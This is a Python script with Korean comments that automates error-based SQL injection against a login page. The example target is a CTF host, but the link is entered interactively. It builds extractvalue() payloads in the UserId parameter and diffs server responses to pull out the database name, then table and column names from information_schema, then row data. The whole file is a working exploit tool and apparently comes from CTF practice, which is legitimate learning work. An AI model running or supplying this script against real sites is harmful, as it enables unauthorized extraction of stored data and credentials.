import requests
import json
from urllib import parse
from diff_match_patch import diff_match_patch
from bs4 import BeautifulSoup

f = open("result.txt",'w')
dmp = diff_match_patch()


##########################1단계 - sql injection point #link + parameter----------------------------
print(" -----------------------[*] 1st Step : SQL injection Point -----------------------\n")
#인풋 입력
print("\n type link ex : http://ctf.segfaulthub.com:7777/sqli_2/login.php")
links = "http://"+input("Link(without parameter) : http://")
#print("\n type in parameters ex : UserId , Password , Submit") #파라미터 개수 입력 부분, 현재 제작중단.
'''
parameter = ['UserId','Password','Submit']
postData = {}
for par in parameter:
    if par == 'Submit':
        postData[par] = "Login"
        continue
    postData[par] = input("Type in the value in the parameter ("+par+") : ")
print("Parameters : "+postData)
'''
'''UserId=normaltic & Password=1234 & Submit=Login'''
successfulResponse = requests.post(links, data={'UserId':'normaltic','Password':'1234','Submit':'Login'})
failedResponse = requests.post(links, data={'UserId':'normaltic','Password':'failfailfail','Submit':'Login'})
#{'UserId':'normaltic3','Password':'1234','Submit':'Login'}
#로그인에 성공하면 response에 normaltic 등장(index.php로 이동). status 코드는 302가 나오지 않고 둘다 200, 
#로그인에 실패하면 login.php에서 incorrect information 등장


##########################2단계 - 컬럼 개수 찾기 #columnCount ----------------------------
print("\n -----------------------[**] 2nd Step : Choosing Error Function -----------------------\n")
#default : extractvalue()
###########################3단계 - 출력되는 컬럼 위치 찾기-------------------------------------------
print("\n -----------------------[***] 3rd Step : Attack Format -----------------------\n")
#normaltic' and extractvalue('1',concat(0x3a, (중요 쿼리))) and '1'='1
attackFormatStart =" normaltic' and "
attackFunction = "extractvalue('1',concat(0x3a, ("
#여기쯤에 페이로드를 넣으면 된다.
attackFormatEnd = "))) and '1'='1"
errorMes="Could not update data: XPATH syntax error: ':"
###########################4단계 - DB 확인--------------------------------------------------------
print("\n -----------------------[****] 4th Step : DB Name! -----------------------\n")
dbPayload = "select database()"
payload = attackFormatStart+attackFunction+dbPayload+attackFormatEnd
response = requests.post(links,data={'UserId':payload,'Password':'1234','Submit':'Login'})

#print(response.text)

before = BeautifulSoup(failedResponse.text,"lxml").text.replace('\n','')
after = BeautifulSoup(response.text.replace(errorMes,''),"lxml").text.replace('\n','').replace('\'','')
res_dif = dmp.diff_main(before,after)
dmp.diff_cleanupSemantic(res_dif)
idx = 0
for d in res_dif:
    print("Number : "+str(idx))
    print(d)
    print('\n')
    idx+=1

selectedTupleidx = int(input("Which one is likely to be a DB Name? : Number."))
dbName = res_dif[selectedTupleidx][1]
print("DB name : "+dbName+"\n")
f.write("DB name : "+dbName+"\n")

###########################5단계 - 테이블 확인--------------------------------------------------------
print("\n -----------------------[*****] 5th Step : Table Name! -----------------------\n")
tablePayload = "select table_name from information_schema.tables where table_schema='"+dbName+"' limit 0,1"
payload = attackFormatStart+attackFunction+tablePayload+attackFormatEnd

tableList = [None] * 20
for i in range(1,40):
    response = requests.post(links,data={'UserId':payload,'Password':'1234','Submit':'Login'})
    before = BeautifulSoup(failedResponse.text,"lxml").text.replace('\n','')
    after = BeautifulSoup(response.text.replace(errorMes,''),"lxml").text.replace('\n','').replace('\'','')
    res_dif = dmp.diff_main(before,after)
    dmp.diff_cleanupSemantic(res_dif)
    idx = 0
    for d in res_dif:
        print("Number : "+str(idx))
        print(d)
        print('\n')
        idx+=1
    
    selectedTupleidx = int(input("Which one is a table Name? type '99' to exit : Number."))
    if selectedTupleidx == 99:
        break
    tableList[i-1]= res_dif[selectedTupleidx][1]
    print("Table name : "+str(i)+". "+tableList[i-1]+"\n")
    f.write("Table name : "+str(i)+". "+tableList[i-1]+"\n")
    payload = payload.replace('limit '+str(i-1)+',1','limit '+str(i)+',1')

print("_______________table all searched_______________")
tableList = list(filter(None,tableList))

for i in range(0,len(tableList)):
    if tableList[i] is not None:
        print("table "+str(i+1)+". "+tableList[i])

if len(tableList)>1:
    table = tableList[int(input("Select a table : table Number."))-1]
else:
    table = tableList[0]
print("selected Table : "+table+"\n")
f.write("selected Table : "+table+"\n")

###########################6단계 - 컬럼 확인--------------------------------------------------------
print("\n -----------------------[******] 6th Step : Column Name! -----------------------\n")
columnPayload = "select column_name from information_schema.columns where table_name='"+table+"' limit 0,1"
payload = attackFormatStart+attackFunction+columnPayload+attackFormatEnd

columnList = [None] * 20
for i in range(1,40):
    response = requests.post(links,data={'UserId':payload,'Password':'1234','Submit':'Login'})
    before = BeautifulSoup(failedResponse.text,"lxml").text.replace('\n','')
    after = BeautifulSoup(response.text.replace(errorMes,''),"lxml").text.replace('\n','').replace('\'','')
    res_dif = dmp.diff_main(before,after)
    dmp.diff_cleanupSemantic(res_dif)
    idx = 0
    for d in res_dif:
        print("Number : "+str(idx))
        print(d)
        print('\n')
        idx+=1
    
    selectedTupleidx = int(input("Which one is a column Name? type '99' to exit : Number."))
    if selectedTupleidx == 99:
        break
    columnList[i-1]= res_dif[selectedTupleidx][1]
    print("Column name : "+str(i)+". "+columnList[i-1]+"\n")
    f.write("Column name : "+str(i)+". "+columnList[i-1]+"\n")
    payload = payload.replace('limit '+str(i-1)+',1','limit '+str(i)+',1')


print("_______________Column all searched_______________")
columnList = list(filter(None,columnList))

for i in range(0,len(columnList)):
    if columnList[i] is not None:
        print("column "+str(i+1)+". "+columnList[i])

if len(columnList)>1:
    column = columnList[int(input("Select a Column : column Number."))-1]
else:
    column = columnList[0]
print("selected Column : "+column+"\n")
f.write("selected Column : "+column+"\n")

###########################7단계 - 데이터 추출--------------------------------------------------------
print("\n -----------------------[*******] 7th Step : DB squeeze! -----------------------\n")
#select name from game limit 0,1
rowPayload = "select "+column+" from "+table+" limit 0,1"
payload = attackFormatStart+attackFunction+rowPayload+attackFormatEnd

rowList = [None] * 20

for i in range(1,40):
    response = requests.post(links,data={'UserId':payload,'Password':'1234','Submit':'Login'})
    before = BeautifulSoup(failedResponse.text,"lxml").text.replace('\n','')
    after = BeautifulSoup(response.text.replace(errorMes,''),"lxml").text.replace('\n','').replace('\'','')
    res_dif = dmp.diff_main(before,after)
    dmp.diff_cleanupSemantic(res_dif)
    idx = 0
    for d in res_dif:
        print("Number : "+str(idx))
        print(d)
        print('\n')
        idx+=1
    
    selectedTupleidx = int(input("Which one is a row Name? type '99' to exit : Number."))
    if selectedTupleidx == 99:
        break
    rowList[i-1]= res_dif[selectedTupleidx][1]
    print("Row name : "+str(i)+". "+rowList[i-1]+"\n")
    f.write("Row name : "+str(i)+". "+rowList[i-1]+"\n")
    payload = payload.replace('limit '+str(i-1)+',1','limit '+str(i)+',1')

print("_______________row all searched_______________")
rowList = list(filter(None,rowList))

for i in range(0,len(rowList)):
    if rowList[i] is not None:
        print(table+" table's row "+str(i+1)+". "+rowList[i])

